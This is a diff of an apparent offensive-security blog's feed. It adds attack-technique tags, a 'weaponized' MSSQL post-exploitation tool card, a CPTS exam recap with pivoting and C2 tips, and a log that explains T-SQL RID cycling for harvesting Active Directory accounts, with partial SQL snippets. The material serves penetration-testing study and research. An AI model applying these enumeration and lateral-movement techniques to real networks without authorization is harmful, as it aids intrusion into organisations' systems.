@@ -956,11 +1308,19 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #WriteProperty
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #Logon-Scripts
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #scriptPath-Hijack
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SYSVOL
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
@@ -981,6 +1341,14 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #Machine-Account-Takeover
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Constraned-Delegation
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Protocol-Transition
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
@@ -1040,7 +1408,31 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Active-Directory
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Share-Write
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #CVE-2025-24071
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #NetNTLMv2
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #NetNTLMv2-Capture
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #GenericAll
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #CA_SVC
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
@@ -1053,10 +1445,6 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #ACL-Abuse
-      &lt;/span&gt;
-      
-      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
-        #Active-Directory
       &lt;/span&gt;
       
     &lt;/div&gt;
@@ -1120,7 +1508,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
-        #DNS-Abuse
+        #DNS-Spoofing
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
@@ -1149,7 +1537,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     <title>AdonisJS BodyParser</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/9/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/9/</id>
 
     
@@ -1295,7 +1683,7 @@ module.exports = function() {
     <title>EternalBlue</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/8/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/8/</id>
 
     
@@ -1474,7 +1862,7 @@ module.exports = function() {
     <title>MongoBleed</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/7/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/7/</id>
 
     
@@ -1584,7 +1972,7 @@ module.exports = function() {
     <title>AsyncOS Quarantine Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/6/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/6/</id>
 
     
@@ -1695,7 +2083,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>FortiWeb Edge Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/5/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/5/</id>
 
     
@@ -1822,7 +2210,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>iOS26 &quot;Liquid Glass&quot; Exploitation Chain</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/4/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/4/</id>
 
     
@@ -1958,7 +2346,7 @@ The final flaw allows the attacker to escape the sandbox via an &lt;strong&gt;In
     <title>Firefox IPC Sandbox Escape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/3/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/3/</id>
 
     
@@ -2094,7 +2482,7 @@ Validating that an input is an “Integer” is insufficient when that integer c
     <title>Lazarus 0day (AppLocker LPE)</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/2/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/2/</id>
 
     
@@ -2194,7 +2582,7 @@ The driver accepted the IOCTL and processed the pointer regardless of the caller
     <title>The MAESTRO Breakout: ESXi Ring -1 Compromise</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/12/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/12/</id>
 
     
@@ -2460,7 +2848,7 @@ Finally, the ease with which the attackers bridged the gap from User Mode to Ker
     <title>PS5 Hypervisor Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/11/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/11/</id>
 
     
@@ -2652,7 +3040,7 @@ Software sandboxing is no longer sufficient for legacy compatibility layers.&lt;
     <title>N8scape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/10/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/10/</id>
 
     
@@ -2808,7 +3196,7 @@ Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their st
     <title>React2Shell RCE</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/1/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/1/</id>
 
     
@@ -2917,7 +3305,7 @@ Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their st
     <title>Anatomy of a Bug</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/</id>
 
     
@@ -3091,7 +3479,7 @@ High-fidelity technical analyses of critical vulnerabilities, kernel exploits, a
     <title>Anatomy of a Bug - LICENSE</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/LICENSE/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/LICENSE/</id>
 
     
@@ -3174,7 +3562,7 @@ f. &lt;strong&gt;Share&lt;/strong&gt; means to provide material to the public by
     <title>Projects</title>
     
     <link href="http://localhost:4000/projects/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/projects/</id>
 
     
@@ -3189,6 +3577,65 @@ Tactical development logs and architectural research. These records document the
 
 &lt;div class=&quot;projects-grid&quot;&gt;
 
+
+&lt;div class=&quot;project-card&quot; style=&quot;border: 1px solid var(--border); padding: 1.5rem; margin-bottom: 2.5rem; background: #0a0a0a;&quot;&gt;
+  
+  &lt;div style=&quot;display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1rem;&quot;&gt;
+    &lt;h2 style=&quot;margin: 0; line-height: 1.2;&quot;&gt;
+      &lt;a href=&quot;/projects/enummssql/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;EnumMSSQL&lt;/a&gt;
+    &lt;/h2&gt;
+    
+    &lt;div style=&quot;font-family: var(--font-mono); font-size: 0.65rem; white-space: nowrap; margin-top: 4px;&quot;&gt;
+      &lt;span style=&quot;color: var(--accent); border: 1px solid var(--accent); padding: 2px 8px;&quot;&gt;
+        [ACTIVE]
+      &lt;/span&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TIMELINE:&lt;/span&gt; May 2026 – Present&lt;/span&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;LANG:&lt;/span&gt; Bash / SQL&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+    EnumMSSQL is a weaponized, standalone post-exploitation wrapper engineered in Bash to automate the entire MSSQL enumeration and lateral movement lifecycle. Moving far beyond generic script execution, it abstracts away complex...
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Bash
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      MSSQL
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      T-SQL
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      mssqlclient
+    &lt;/span&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center;&quot;&gt;
+    
+    &lt;a href=&quot;/projects/enummssql/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none; white-space: nowrap;&quot;&gt;
+      ACCESS_FULL_DOSSIER_AND_LOGS -&amp;gt;
+    &lt;/a&gt;
+
+    
+    &lt;a href=&quot;https://github.com/tralsesec/EnumMSSQL&quot; target=&quot;_blank&quot; style=&quot;font-family: var(--font-mono); font-size: 0.75rem; color: var(--fg-dim); border: none; display: flex; align-items: center; gap: 5px; white-space: nowrap;&quot;&gt;
+      &lt;svg height=&quot;14&quot; width=&quot;14&quot; viewBox=&quot;0 0 16 16&quot; fill=&quot;currentColor&quot; style=&quot;opacity: 0.8;&quot;&gt;&lt;path d=&quot;M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+      SOURCE_CODE
+    &lt;/a&gt;
+    
+  &lt;/div&gt;
+  
+&lt;/div&gt;
 
 &lt;div class=&quot;project-card&quot; style=&quot;border: 1px solid var(--border); padding: 1.5rem; margin-bottom: 2.5rem; background: #0a0a0a;&quot;&gt;
   
@@ -3210,7 +3657,7 @@ Tactical development logs and architectural research. These records document the
   &lt;/div&gt;
 
   &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-    Executive Summary Revenant is a high-performance Dynamic Binary Translation (DBT) framework engineered in Rust. It specializes in the automated deobfuscation of polymorphic and metamorphic malware by lifting opaque binary blobs...
+    Revenant is a high-performance Dynamic Binary Translation (DBT) framework engineered in Rust. It specializes in the automated deobfuscation of polymorphic and metamorphic malware by lifting opaque binary blobs into LLVM...
   &lt;/div&gt;
 
   &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
@@ -3455,6 +3902,215 @@ hr {
   </entry>
   
   <entry>
+    <title>CPTS Recap: The Academy, The Exam &amp; A 200-Page Report</title>
+    
+    <link href="http://localhost:4000/training/career/2026/06/03/cpts-recap.html"/>
+    <updated>2026-06-03T22:25:00+02:00</updated>
+    <id>http://localhost:4000/training/career/2026/06/03/cpts-recap.html</id>
+
+    
+    
+      <category term="System Log" label="SysLog" />
+    
+    
+    <content type="html">&lt;p&gt;The CPTS is officially done.&lt;/p&gt;
+
+&lt;p&gt;Before we get into the details, let’s address the basics: What is the Hack The Box Certified Penetration Testing Specialist (CPTS), how much does it cost, and how does it compare to other certifications like OSCP? Honestly, there are already 10,000 YouTube videos and Medium articles debating this. I’m not going to waste time rehashing it here. Instead, here is a breakdown of my actual experience going through the training, the exam environment, and delivering the final report.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-htb-academy-from-zero-to-enterprise&quot;&gt;The HTB Academy: From Zero to Enterprise&lt;/h3&gt;
+
+&lt;p&gt;The associated path in the HTB Academy is massive. The material genuinely starts from absolute zero. Anyone could technically jump in and start learning but it scales up significantly. It covers the entire spectrum: Web Exploitation, Windows Internals, Linux Privilege Escalation, and deep Active Directory mechanics.&lt;/p&gt;
+
+&lt;p&gt;They did not hold back. Nothing was intentionally left out, and the sheer volume of content is impressive.&lt;/p&gt;
+
+&lt;p&gt;If you want to know what the exam feels like, pay close attention to the final module: &lt;em&gt;Attacking Enterprise Networks&lt;/em&gt; (AEN). This module is highly representative of the actual exam environment, just on a smaller scale. If you can clear that module comfortably, you are technically ready. For comparison: AEN took me about 3-4 hours of unfocused work.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-exam-environment--parallel-reporting&quot;&gt;The Exam Environment &amp;amp; Parallel Reporting&lt;/h3&gt;
+
+&lt;p&gt;The exam environment is essentially a scaled-up version of the final module. To be completely honest, I found the CPTS to be very easy on a technical level. Obviously, difficulty is highly subjective, but keeping in mind that the AEN module only took me a few hours, the exam itself felt fairly trivial. There was nothing extraordinary or overly complex about it, and I completed the practical exploitation phase in about three days.&lt;/p&gt;
+
+&lt;p&gt;But here is the critical detail: &lt;strong&gt;I did the reporting in parallel with the engagement.&lt;/strong&gt; Those three days included writing the report. I didn’t hammer into the keyboard for three days and then spend five days writing. Every time I compromised a host or grabbed a hash, I immediately took the screenshot and wrote the text.&lt;/p&gt;
+
+&lt;p&gt;However, the exam did drag on a bit at one specific point. Usually, HTB paths are logical: you enumerate, you find component A, which gives you the access needed to exploit component B. But there was one instance where logic took a back seat. There wasn’t a clean, linear path forward; I just had to try my luck. It required throwing different variations at the wall until something finally clicked. Once past that bottleneck, the momentum returned.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-deliverable-a-200-page-report&quot;&gt;The Deliverable: A 200+ Page Report&lt;/h3&gt;
+
+&lt;p&gt;Reporting is where the real work happens. I ended up writing over 200 pages.&lt;/p&gt;
+
+&lt;p&gt;Most of that was pure text and detailed descriptions. In hindsight, I probably included a few too few screenshots. If I had added more visual evidence, the report would have easily hit 250 pages. I didn’t just document the critical path required to compromise the domain, I documented &lt;em&gt;everything&lt;/em&gt;. During my enumeration, I found numerous vulnerabilities that couldn’t be directly utilized for the main objective, but they were still valid security flaws. Delivering a comprehensive, commercial-grade assessment is always the better approach.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;A massive time-saving tip:&lt;/strong&gt; Write your findings directly into SysReptor as actual findings from the start. Don’t just dump raw text into a scratchpad and plan to format it into a proper finding later. Just create a “New Finding” and document it live. It might feel a bit messy in the moment, but it will save you hours of formatting later. Don’t do the same mistake as me.&lt;/p&gt;
+
+&lt;p&gt;After the report is evaluated you get constructive feedback:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/2026-06-03-feedback.png&quot; alt=&quot;feedback&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, thank you.&lt;/p&gt;
+
+&lt;h3 id=&quot;operational-tips-for-the-trenches&quot;&gt;Operational Tips for the Trenches&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Ligolo-NG:&lt;/strong&gt; Practice, practice, practice. I cannot emphasize this enough. Practice pivoting through multiple subnets across different hosts using different techniques. Local port forwarding, remote port forwarding, SOCKS proxies, etc. etc.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Use a C2:&lt;/strong&gt; Highly recommended. Even meterpreter is way easier to use than spawning 10 different shells on 6 different hosts as 4 different users.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Change Your Enumeration Angle:&lt;/strong&gt; If you find nothing.. absolutely nothing.. then you should enumerate &lt;em&gt;again&lt;/em&gt;, but differently. Staring at the same output won’t magically spawn a shell. Change your perspective, switch your tooling, or look at a different protocol entirely.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Design Notes for a Reboot:&lt;/strong&gt; I had to reset the entire exam network three or four times. Your notes must be bulletproof. You need to write your documentation with one mindset: &lt;em&gt;“If I have to reboot the environment right now, how fast can I get back to this exact pivot point?”&lt;/em&gt; If I hadn’t taken rigorous, structured notes as I went, the exam would have taken significantly longer.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Tmux Logging:&lt;/strong&gt; For those who need a safety net, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tmux&lt;/code&gt; logging to dump all terminal input and output to a file. Honestly, I didn’t use this.. I stuck to my standard workflow of taking manual screenshots. But it’s a solid backup strategy if you’re worried about losing console output.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;the-timeline--logistics&quot;&gt;The Timeline &amp;amp; Logistics&lt;/h3&gt;
+
+&lt;p&gt;Regarding the grading turnaround: I submitted my report on a Friday evening. Naturally, nothing happens over the weekend. I received the official “Passed” confirmation email on Wednesday afternoon.&lt;/p&gt;
+
+&lt;p&gt;So, effectively, it took them 3 working days to review a 200+ page document which is impressive. The official SLA says it can take up to 20 days, but the reality was much faster.&lt;/p&gt;
+
+&lt;p&gt;The CPTS is a massive milestone, but the execution engine doesn’t stop. Back to the lab.&lt;/p&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>Weaponizing T-SQL – Language-Agnostic RID Cycling and Transitive Impersonation</title>
+    
+    <link href="http://localhost:4000/projects/enummssql/2026-05-17-log-001/"/>
+    <updated>2026-05-17T00:00:00+02:00</updated>
+    <id>http://localhost:4000/projects/enummssql/2026-05-17-log-001/</id>
+
+    
+    
+      <category term="Dossier" label="Project" />
+    
+    
+    <content type="html">&lt;p&gt;The transition from &lt;strong&gt;v2.3 to v2.4&lt;/strong&gt; marks a critical evolution for EnumMSSQL. Instead of operating simply as a high-visibility scanner and network capture trigger, v2.4 introduces deep contextual awareness. This update weaponizes low-privilege database access to perform native Active Directory harvesting, maps multi-layered identity delegation chains, and automates high-yield data discovery.&lt;/p&gt;
+
+&lt;p&gt;Here is the architectural breakdown of the newly implemented execution layers: Phases 10, 11, and 12.&lt;/p&gt;
+
+&lt;h3 id=&quot;breaking-localization-language-agnostic-rid-cycling-phase-10&quot;&gt;Breaking Localization: Language-Agnostic RID Cycling (Phase 10)&lt;/h3&gt;
+
+&lt;p&gt;Standard post-exploitation scripts typically fail during Active Directory enumeration if the environment uses non-English language packs (e.g., German, French, Spanish) because they rely on hardcoded strings like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REDELEGATE\Administrator&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REDELEGATE\Domain Users&lt;/code&gt; to capture the base Domain SID.&lt;/p&gt;
+
+&lt;p&gt;v2.4 circumvents this limitation entirely by leveraging an immutable cryptographic anchor: the &lt;strong&gt;Key Distribution Center (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt;) service account&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;1-the-immutable-anchor&quot;&gt;1. The Immutable Anchor&lt;/h4&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt; account name is fixed across all worldwide Windows installations and cannot be modified or renamed. By combining it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DEFAULT_DOMAIN()&lt;/code&gt;, we dynamically obtain its system identity regardless of OS language layout:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;DECLARE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;VARBINARY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUSER_SID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CONCAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DEFAULT_DOMAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;rbtgt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;2-bin-slicing-the-domain-sid&quot;&gt;2. Bin-Slicing the Domain SID&lt;/h4&gt;
+
+&lt;p&gt;The returned binary string is a standard 28-byte Windows SID structure. The final 4 bytes constitute the Relative Identifier (RID), which is always hardcoded to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;502&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x01F6&lt;/code&gt;) for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt;. By systematically applying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUBSTRING&lt;/code&gt;, we drop the final 4 bytes, isolating the pristine &lt;strong&gt;24-byte Domain SID base&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;3-little-endian-hex-reconstruction-via-cte&quot;&gt;3. Little-Endian Hex Reconstruction via CTE&lt;/h4&gt;
+
+&lt;p&gt;Active Directory expects SIDs to be processed in memory using &lt;strong&gt;Little-Endian byte order&lt;/strong&gt; (lowest-value byte stored first). To iterate through thousands of potential users efficiently, the tool runs a Recursive Common Table Expression (CTE) loop that converts integers into 4 distinct bytes using inline T-SQL bit-shifting arithmetic:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CONVERT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;VARBINARY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CONVERT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;VARBINARY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
